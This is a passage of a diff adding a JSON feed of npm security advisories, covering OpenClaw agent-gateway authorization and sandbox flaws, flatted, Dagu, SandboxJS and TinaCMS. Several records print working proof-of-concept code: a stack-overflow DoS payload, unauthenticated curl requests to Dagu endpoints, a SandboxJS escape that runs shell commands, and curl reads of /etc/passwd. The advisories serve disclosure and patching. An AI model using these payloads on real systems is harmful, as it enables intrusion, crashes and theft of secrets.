href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-4jpw-hj22-2xmc\">https://github.com/openclaw/openclaw/security/advisories/GHSA-4jpw-hj22-2xmc</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4jpw-hj22-2xmc\">https://github.com/advisories/GHSA-4jpw-hj22-2xmc</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:30.000Z",
+          "date_published": "2026-03-13T15:47:29.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-4jpw-hj22-2xmc"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "7a647af7bf17f31c9f631eb96a0e5e17",
+        "url": "https://github.com/advisories/GHSA-xw77-45gv-p728",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Plugin subagent routes could bypass gateway authorization with synthetic admin scopes",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xw77-45gv-p728"
+          ],
+          "content_hash": "sha256:d44adf9e1a0ebf0fadf1ffbea2bc721004b12c2d7fedb8625dc0501c5552af44"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, the plugin subagent runtime dispatched gateway methods through a synthetic operator client that always carried broad administrative scopes. Plugin-owned HTTP routes using <code>auth: \"plugin\"</code> could therefore trigger admin-only gateway actions without normal gateway authorization.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is a critical authorization bypass. An external unauthenticated request to a plugin-owned route could reach privileged subagent runtime methods and perform admin-only gateway actions such as deleting sessions, reading session data, or triggering agent execution.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&gt;= 2026.3.7, &lt; 2026.3.11</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The new plugin subagent runtime preserved neither the original caller's auth context nor least-privilege scope. Instead, it executed gateway dispatches through a fabricated operator client with administrative scopes, which was reachable from plugin-owned routes that intentionally bypass normal gateway auth so plugins can perform their own webhook verification.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now preserves real authorization boundaries for plugin subagent calls instead of dispatching them through synthetic admin scopes. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-xw77-45gv-p728\">https://github.com/openclaw/openclaw/security/advisories/GHSA-xw77-45gv-p728</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xw77-45gv-p728\">https://github.com/advisories/GHSA-xw77-45gv-p728</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:25.000Z",
+          "date_published": "2026-03-13T15:47:23.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xw77-45gv-p728"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "ff3811080ec1c1dca629a9a0868fc20d",
+        "url": "https://github.com/advisories/GHSA-xvx8-77m6-gwg6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Sandbox `writeFile` commit could race outside the validated path",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xvx8-77m6-gwg6"
+          ],
+          "content_hash": "sha256:ee672dfd685c585698972be9b7c39798c00639c35a650c17384f0998578ce890"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, the sandbox fs-bridge <code>writeFile</code> commit step used an unanchored container path during the final move into place. An attacker racing parent-path changes inside the sandbox could redirect the committed file outside the validated sandbox path.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This is a sandbox boundary bypass. In-sandbox code could win a time-of-check-time-of-use race and cause host-approved <code>writeFile</code> operations to land outside the validated writable path within the container mount namespace.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt; 2026.3.11</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The hardening work for anchored remove, rename, and mkdir operations did not fully cover the <code>writeFile</code> commit path. The final <code>mv</code> still used the raw target path, leaving a race window between safety revalidation and the in-container commit step.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now anchors the <code>writeFile</code> commit path to the canonical parent directory before the final move. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-xvx8-77m6-gwg6\">https://github.com/openclaw/openclaw/security/advisories/GHSA-xvx8-77m6-gwg6</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvx8-77m6-gwg6\">https://github.com/advisories/GHSA-xvx8-77m6-gwg6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:47:16.000Z",
+          "date_published": "2026-03-13T15:47:15.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xvx8-77m6-gwg6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "6917136ffc38555f81692f37fd2e4837",
+        "url": "https://github.com/advisories/GHSA-25h7-pfq9-p65f",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[flatted] flatted vulnerable to unbounded recursion DoS in parse() revive phase",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-25h7-pfq9-p65f"
+          ],
+          "content_hash": "sha256:ddce5563e6f36ce198353964e70f28cde308776c3ea0dc02d3f97a3baf15e17c"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>flatted's <code>parse()</code> function uses a recursive <code>revive()</code> phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential <code>$</code> indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>Denial of Service (DoS). Any application that passes untrusted input to <code>flatted.parse()</code> can be crashed by an unauthenticated attacker with a single request.</p>\n<p>flatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<pre><code class=\"language-javascript\">const flatted = require('flatted');\n\n// Build deeply nested circular reference chain\nconst depth = 20000;\nconst arr = new Array(depth + 1);\narr[0] = '{\"a\":\"1\"}';\nfor (let i = 1; i &lt;= depth; i++) {\n  arr[i] = `{\"a\":\"${i + 1}\"}`;\n}\narr[depth] = '{\"a\":\"leaf\"}';\n\nconst payload = JSON.stringify(arr);\nflatted.parse(payload); // RangeError: Maximum call stack size exceeded\n</code></pre>\n<h2 id=\"fix\">Fix</h2>\n<p>The maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive <code>revive()</code> to a stack-based loop.</p>\n<h2 id=\"affected-versions\">Affected Versions</h2>\n<p>All versions prior to the PR #88 fix.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f\">https://github.com/WebReflection/flatted/security/advisories/GHSA-25h7-pfq9-p65f</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32141\">https://nvd.nist.gov/vuln/detail/CVE-2026-32141</a></li>\n<li><a href=\"https://github.com/WebReflection/flatted/pull/88\">https://github.com/WebReflection/flatted/pull/88</a></li>\n<li><a href=\"https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606\">https://github.com/WebReflection/flatted/commit/7eb65d857e1a40de11c47461cdbc8541449f0606</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-25h7-pfq9-p65f\">https://github.com/advisories/GHSA-25h7-pfq9-p65f</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:40:44.000Z",
+          "date_published": "2026-03-13T15:40:42.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-25h7-pfq9-p65f"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "778342355798b55ccd59b8826da0547f",
+        "url": "https://github.com/advisories/GHSA-9wmw-9wph-2vwp",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[dagu] Dagu: SSE Authentication Bypass in Basic Auth Mode",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-9wmw-9wph-2vwp"
+          ],
+          "content_hash": "sha256:5846bd323b9bdbea962a06029d910f74acc2b236c0ee71d9d7ce6afffdfda8b6"
+        },
+        "source_payload": {
+          "content_html": "<h1 id=\"sse-authentication-bypass-in-basic-auth-mode\">SSE Authentication Bypass in Basic Auth Mode</h1>\n<h2 id=\"summary\">Summary</h2>\n<p>When Dagu is configured with HTTP Basic authentication (<code>DAGU_AUTH_MODE=basic</code>), all Server-Sent Events (SSE) endpoints are accessible without any credentials. This allows unauthenticated attackers to access real-time DAG execution data, workflow configurations, execution logs, and queue status — bypassing the authentication that protects the REST API.</p>\n<h2 id=\"severity\">Severity</h2>\n<p><strong>HIGH</strong> (CVSS 3.1: 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</p>\n<h2 id=\"affected-versions\">Affected Versions</h2>\n<ul>\n<li>dagu v2.2.3 (latest) and likely all versions with basic auth support</li>\n</ul>\n<h2 id=\"affected-component\">Affected Component</h2>\n<p><code>internal/service/frontend/server.go</code> — <code>buildStreamAuthOptions()</code> function (lines 1177–1201)</p>\n<h2 id=\"root-cause\">Root Cause</h2>\n<p>The <code>buildStreamAuthOptions()</code> function builds authentication options for SSE/streaming endpoints. When the auth mode is <code>basic</code>, it returns an <code>auth.Options</code> struct with <code>BasicAuthEnabled: true</code> but <code>AuthRequired</code> defaults to <code>false</code> (Go zero value):</p>\n<pre><code class=\"language-go\">// server.go:1195-1201\nif authCfg.Mode == config.AuthModeBasic {\n    return auth.Options{\n        Realm:            realm,\n        BasicAuthEnabled: true,\n        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},\n        // AuthRequired is NOT set — defaults to false\n    }\n}\n</code></pre>\n<p>The authentication middleware at <code>internal/service/frontend/auth/middleware.go:181-183</code> allows unauthenticated requests when <code>AuthRequired</code> is false:</p>\n<pre><code class=\"language-go\">// No credentials provided\n// If auth is not required, allow the request through\nif !opts.AuthRequired {\n    next.ServeHTTP(w, r)\n    return\n}\n</code></pre>\n<p>The developers left a FIXME comment (line 1193) acknowledging this issue:</p>\n<pre><code>// FIXME: add a session-token mechanism for basic-auth users so browser\n// EventSource requests can authenticate via the ?token= query parameter.\n</code></pre>\n<h2 id=\"exposed-sse-endpoints\">Exposed SSE Endpoints</h2>\n<p>All SSE routes are affected (<code>server.go:1004-1019</code>):</p>\n<table>\n<thead>\n<tr>\n<th>Endpoint</th>\n<th>Data Leaked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>/api/v1/events/dags</code></td>\n<td>All DAG names, descriptions, file paths, schedules, tags, execution status</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dags/{fileName}</code></td>\n<td>Individual DAG configuration details</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dags/{fileName}/dag-runs</code></td>\n<td>DAG execution history</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dag-runs</code></td>\n<td>All active DAG runs across the system</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}</code></td>\n<td>Specific DAG run status and node details</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}/logs</code></td>\n<td>Execution logs (may contain secrets, credentials, API keys)</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/dag-runs/{name}/{dagRunId}/logs/steps/{stepName}</code></td>\n<td>Step-level stdout/stderr logs</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/queues</code></td>\n<td>Queue status and pending work items</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/queues/{name}/items</code></td>\n<td>Queue item details</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/docs-tree</code></td>\n<td>Documentation tree</td>\n</tr>\n<tr>\n<td><code>/api/v1/events/docs/*</code></td>\n<td>Documentation content</td>\n</tr>\n</tbody></table>\n<p>Additionally, the Agent SSE stream uses the same auth options (<code>server.go:1166</code>).</p>\n<h2 id=\"proof-of-concept\">Proof of Concept</h2>\n<h3 id=\"setup\">Setup</h3>\n<pre><code class=\"language-bash\"># Start Dagu with basic auth\nexport DAGU_AUTH_MODE=basic\nexport DAGU_AUTH_BASIC_USERNAME=admin\nexport DAGU_AUTH_BASIC_PASSWORD=secret123\ndagu start-all\n</code></pre>\n<h3 id=\"verify-rest-api-requires-auth\">Verify REST API requires auth</h3>\n<pre><code class=\"language-bash\"># Regular API — returns 401 Unauthorized\ncurl -s -o /dev/null -w \"%{http_code}\" http://localhost:8080/api/v1/dags\n# Output: 401\n\n# With credentials — returns 200\ncurl -s -o /dev/null -w \"%{http_code}\" -u admin:secret123 http://localhost:8080/api/v1/dags\n# Output: 200\n</code></pre>\n<h3 id=\"exploit-sse-bypass\">Exploit SSE bypass</h3>\n<pre><code class=\"language-bash\"># SSE endpoint WITHOUT any credentials — returns 200 with full data\ncurl -s -N http://localhost:8080/api/v1/events/dags\n</code></pre>\n<p><strong>Output (truncated):</strong></p>\n<pre><code>event: connected\ndata: {\"topic\":\"dagslist:\"}\n\nevent: data\ndata: {\"dags\":[{\"dag\":{\"name\":\"example-01-basic-sequential\",\"schedule\":[],...},\n\"filePath\":\"/home/user/.config/dagu/dags/example-01-basic-sequential.yaml\",\n\"latestDAGRun\":{\"dagRunId\":\"...\",\"status\":4,\"statusLabel\":\"succeeded\",...}},\n...]}\n</code></pre>\n<pre><code class=\"language-bash\"># Access execution logs without credentials\ncurl -s -N http://localhost:8080/api/v1/events/dag-runs/{dagName}/{runId}/logs\n</code></pre>\n<p><strong>Output:</strong></p>\n<pre><code>event: data\ndata: {\"schedulerLog\":{\"content\":\"...step execution details, parameters, outputs...\"},\"stepLogs\":[...]}\n</code></pre>\n<h3 id=\"wrong-credentials-are-rejected\">Wrong credentials are rejected</h3>\n<pre><code class=\"language-bash\"># Invalid credentials — returns 401 (auth validates IF provided, but doesn't REQUIRE it)\ncurl -s -o /dev/null -w \"%{http_code}\" -u wrong:wrong http://localhost:8080/api/v1/events/dags\n# Output: 401\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<p>An unauthenticated network attacker can:</p>\n<ol>\n<li><strong>Enumerate all workflows</strong>: DAG names, descriptions, file paths, schedules, and tags</li>\n<li><strong>Monitor execution in real-time</strong>: Track which workflows are running, their status, and when they complete</li>\n<li><strong>Read execution logs</strong>: Access stdout/stderr of workflow steps, which commonly contain sensitive data (API keys, database credentials, tokens, internal hostnames)</li>\n<li><strong>Map infrastructure</strong>: File paths and workflow configurations reveal server directory structure and deployment details</li>\n<li><strong>Observe queue state</strong>: Understand pending work items and system load</li>\n</ol>\n<p>This is especially critical in environments where:</p>\n<ul>\n<li>Workflows process sensitive data (credentials, PII, financial data)</li>\n<li>DAG parameters contain secrets passed at runtime</li>\n<li>Log output includes API responses or database queries with sensitive content</li>\n</ul>\n<h2 id=\"suggested-fix\">Suggested Fix</h2>\n<p>Set <code>AuthRequired: true</code> for basic auth mode and implement the session-token mechanism referenced in the FIXME comment:</p>\n<pre><code class=\"language-go\">if authCfg.Mode == config.AuthModeBasic {\n    return auth.Options{\n        Realm:            realm,\n        BasicAuthEnabled: true,\n        AuthRequired:     true,  // Require authentication\n        Creds:            map[string]string{authCfg.Basic.Username: authCfg.Basic.Password},\n    }\n}\n</code></pre>\n<p>For browser SSE compatibility, implement a session token that can be passed via the <code>?token=</code> query parameter (the <code>QueryTokenMiddleware</code> already exists at <code>auth/middleware.go:39</code> to convert query params to Bearer tokens).</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dagu-org/dagu/security/advisories/GHSA-9wmw-9wph-2vwp\">https://github.com/dagu-org/dagu/security/advisories/GHSA-9wmw-9wph-2vwp</a></li>\n<li><a href=\"https://github.com/dagu-org/dagu/commit/064616c9b80c04824c1c7c357308f77f3f24d775\">https://github.com/dagu-org/dagu/commit/064616c9b80c04824c1c7c357308f77f3f24d775</a></li>\n<li><a href=\"https://github.com/dagu-org/dagu/releases/tag/v2.2.4\">https://github.com/dagu-org/dagu/releases/tag/v2.2.4</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9wmw-9wph-2vwp\">https://github.com/advisories/GHSA-9wmw-9wph-2vwp</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T15:05:35.000Z",
+          "date_published": "2026-03-13T15:05:32.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-9wmw-9wph-2vwp"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "8a3b0fae0f104bf2b3f3809eb7544136",
+        "url": "https://github.com/advisories/GHSA-6r9f-759j-hjgv",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@nyariv/sandboxjs] SandboxJS affected by a Sandbox Escape",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-6r9f-759j-hjgv"
+          ],
+          "content_hash": "sha256:39d3c0fdc744db87c27f7916cf88e54f1113d60584b69491916e8d63e0671551"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>It is possible to obtain arrays containing <code>Function</code>, which allows escaping the sandbox.</p>\n<h3 id=\"details\">Details</h3>\n<p>There are various ways to get an array containing <code>Function</code>, e.g.</p>\n<pre><code class=\"language-js\">Object.entries(this).at(1) // [ 'Function', [Function: Function] ]\nObject.values(this).slice(1, 2) // [ [Function: Function] ]\n</code></pre>\n<p>Given an array containing <code>Function</code>, and  <code>Object.fromEntries</code>, it is possible to construct <code>{[p]: Function}</code> where <code>p</code> is any constructible property. This can be used to escape the sandbox.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-js\">const s = require('.').default;\nconst sb = new s();\n\npayload = `\nconst p = (async function () {})();\n({\n  \"finally\": p.finally,\n  ...Object.fromEntries([['then', ...Object.values(this).slice(1)]]),\n}).finally('a=process.getBuiltinModule(\"child_process\").execSync(\"ls\", {stdio: \"inherit\"})')();\n`;\n\nsb.compile(payload)().run();\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Sandbox Escape -&gt; RCE</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nyariv/SandboxJS/security/advisories/GHSA-6r9f-759j-hjgv\">https://github.com/nyariv/SandboxJS/security/advisories/GHSA-6r9f-759j-hjgv</a></li>\n<li><a href=\"https://github.com/nyariv/SandboxJS/commit/e01505b1ea49f4f13956cd12b7ce01b83d2ee085\">https://github.com/nyariv/SandboxJS/commit/e01505b1ea49f4f13956cd12b7ce01b83d2ee085</a></li>\n<li><a href=\"https://github.com/nyariv/SandboxJS/releases/tag/v0.8.34\">https://github.com/nyariv/SandboxJS/releases/tag/v0.8.34</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6r9f-759j-hjgv\">https://github.com/advisories/GHSA-6r9f-759j-hjgv</a></li>\n</ul>\n",
+          "date_modified": "2026-03-13T13:46:09.000Z",
+          "date_published": "2026-03-13T13:46:08.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-6r9f-759j-hjgv"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "936a41063ab3e47d0b79732e5b2eee68",
+        "url": "https://github.com/advisories/GHSA-5wcw-8jjv-m286",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[openclaw] OpenClaw: Untrusted web origins can obtain authenticated operator.admin access in trusted-proxy mode",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-5wcw-8jjv-m286"
+          ],
+          "content_hash": "sha256:b03fe3abb4eadd317209d616c412c4354fc0a437e8ef3f4be77ee60586f42e79"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>In affected versions of <code>openclaw</code>, browser-originated WebSocket connections could bypass origin validation when <code>gateway.auth.mode</code> was set to <code>trusted-proxy</code> and the request arrived with proxy headers. A page served from an untrusted origin could connect through a trusted reverse proxy, inherit proxy-authenticated identity, and establish a privileged operator session.</p>\n<h2 id=\"impact\">Impact</h2>\n<p>This issue affects deployments that expose the Gateway behind a trusted reverse proxy and rely on browser origin checks such as <code>controlUi.allowedOrigins</code> to restrict browser access. An attacker who can cause a victim browser to load a malicious page that can reach the proxy endpoint could establish a cross-site WebSocket connection and call privileged Gateway methods.</p>\n<p>In verified impact, the attacker-origin page was able to request <code>operator.admin</code> and successfully call <code>config.get</code>, exposing sensitive configuration. Depending on the deployment, the same authenticated operator path could also permit other privileged reads or mutations available to operator-class callers.</p>\n<h2 id=\"affected-packages-and-versions\">Affected Packages and Versions</h2>\n<ul>\n<li>Package: <code>openclaw</code> (npm)</li>\n<li>Affected versions: <code>&lt; 2026.3.11</code></li>\n<li>Fixed in: <code>2026.3.11</code></li>\n</ul>\n<h2 id=\"technical-details\">Technical Details</h2>\n<p>The WebSocket handshake logic treated proxy-delivered requests as exempt from the generic browser origin check whenever an <code>Origin</code> header was present alongside proxy headers. In <code>trusted-proxy</code> mode, that exemption allowed browser-originated connections to skip the normal origin-validation path even though they were still browser requests.</p>\n<p>Because trusted-proxy authentication can produce a shared authenticated operator context, the affected path could retain requested operator scopes after the handshake. That made the browser origin check the missing boundary between an untrusted origin and an authenticated operator-class session.</p>\n<h2 id=\"fix\">Fix</h2>\n<p>OpenClaw now enforces browser origin validation for any browser-originated WebSocket connection regardless of whether proxy headers are present. The fix shipped in <code>openclaw@2026.3.11</code>.</p>\n<p>Fixed commit: <code>ebed3bbde1a72a1aaa9b87b63b91e7c04a50036b</code>\nRelease tag: <code>v2026.3.11</code></p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p>Upgrade to <code>2026.3.11</code> or later.</p>\n<p>If you cannot upgrade immediately, avoid exposing browser-reachable Gateway WebSocket endpoints in <code>trusted-proxy</code> mode to untrusted origins, and ensure reverse-proxy/browser reachability is restricted to trusted origins only.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/openclaw/openclaw/security/advisories/GHSA-5wcw-8jjv-m286\">https://github.com/openclaw/openclaw/security/advisories/GHSA-5wcw-8jjv-m286</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/commit/ebed3bbde1a72a1aaa9b87b63b91e7c04a50036b\">https://github.com/openclaw/openclaw/commit/ebed3bbde1a72a1aaa9b87b63b91e7c04a50036b</a></li>\n<li><a href=\"https://github.com/openclaw/openclaw/releases/tag/v2026.3.11\">https://github.com/openclaw/openclaw/releases/tag/v2026.3.11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wcw-8jjv-m286\">https://github.com/advisories/GHSA-5wcw-8jjv-m286</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T20:32:59.000Z",
+          "date_published": "2026-03-12T20:32:59.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-5wcw-8jjv-m286"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "e5ce522e114ce372da5dd8d0ab5a18d3",
+        "url": "https://github.com/advisories/GHSA-m48g-4wr2-j2h6",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@tinacms/cli] TinaCMS CLI has Arbitrary File Read via Disabled Vite Filesystem Restriction",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-m48g-4wr2-j2h6"
+          ],
+          "content_hash": "sha256:78cbe298d5a3ce860833a0b8cb2ecdd070edd98f7b76ffcc1b79745569a36375"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The TinaCMS CLI dev server configures Vite with <code>server.fs.strict: false</code>, which disables Vite's built-in filesystem access restriction. This allows any unauthenticated attacker who can reach the dev server to read arbitrary files on the host system</p>\n<h2 id=\"details\">Details</h2>\n<p>When running <code>tinacms dev</code>, the CLI starts a Vite dev server configured in:\n<code>packages/@tinacms/cli/src/next/vite/index.ts</code></p>\n<pre><code>server: {\n  host: configManager.config?.build?.host ?? false,\n  ...\n  fs: {\n    strict: false, // Disables Vite's filesystem access restriction\n  },\n},\n</code></pre>\n<p>TinaCMS middleware only intercepts specific route prefixes (/media/*, /graphql, /altair, /searchIndex). Any request to a path outside these routes falls through to Vite's default static file handler, which will serve the file directly from the absolute path on the filesystem.\nAdditionally, the server enables permissive CORS (cors() with no origin restriction), which may further facilitate browser-based exploitation such as DNS rebinding attacks.</p>\n<h2 id=\"poc\">PoC</h2>\n<p><strong>Prerequisites</strong>: TinaCMS CLI dev server running (default port 4001).</p>\n<ul>\n<li>Read system files directly:</li>\n</ul>\n<pre><code>curl http://localhost:4001/etc/passwd\n</code></pre>\n<img width=\"705\" height=\"332\" alt=\"image\" src=\"https://github.com/user-attachments/assets/6fd0e1c7-a549-40c8-bc81-af9c343f52a0\">\n\n<pre><code>curl http://localhost:4001/etc/hostname\n</code></pre>\n<img width=\"631\" height=\"41\" alt=\"image\" src=\"https://github.com/user-attachments/assets/bd103dc3-d4c3-4774-8007-b55de3fc2a9e\">\nVite resolves and serves the absolute path directly from the filesystem.\n\n\n<h2 id=\"impact\">Impact</h2>\n<p>Any developer running tinacms dev in an environment where the dev server port is reachable by an attacker. This includes:</p>\n<ul>\n<li><p>Cloud IDEs (GitHub Codespaces, Gitpod) where ports are automatically forwarded and publicly accessible</p>\n</li>\n<li><p>Docker or VM setups with port forwarding configured</p>\n</li>\n<li><p>Misconfigured environments binding to 0.0.0.0 via the build.host config option</p>\n</li>\n<li><p>Systems targeted via DNS rebinding attacks, leveraging the unrestricted CORS policy</p>\n</li>\n<li><p>Local environments with malicious dependencies running on the same machine</p>\n</li>\n</ul>\n<p>An attacker who can reach port 4001 can:</p>\n<ul>\n<li><p>Read any file readable by the server process (/etc/passwd, /etc/shadow, SSH private keys)</p>\n</li>\n<li><p>Exfiltrate environment variables and secrets via /proc/self/environ</p>\n</li>\n<li><p>Access cloud credentials and API keys from configuration files</p>\n</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tinacms/tinacms/security/advisories/GHSA-m48g-4wr2-j2h6\">https://github.com/tinacms/tinacms/security/advisories/GHSA-m48g-4wr2-j2h6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-29066\">https://nvd.nist.gov/vuln/detail/CVE-2026-29066</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m48g-4wr2-j2h6\">https://github.com/advisories/GHSA-m48g-4wr2-j2h6</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T20:32:44.000Z",
+          "date_published": "2026-03-12T20:32:43.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-m48g-4wr2-j2h6"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "635739c633b715b986a9f13ac109b0c2",
+        "url": "https://github.com/advisories/GHSA-2f24-mg4x-534q",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@tinacms/cli] TinaCMS Vulnerable to Path Traversal Leading to Arbitrary File Read, Write and Delete",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-13T17:51:55Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-2f24-mg4x-534q"
+          ],
+          "content_hash": "sha256:60ce98e560af014d286af217299fb1a94402be195e50cd4408e8b688a22d0170"
+        },
+        "source_payload": {
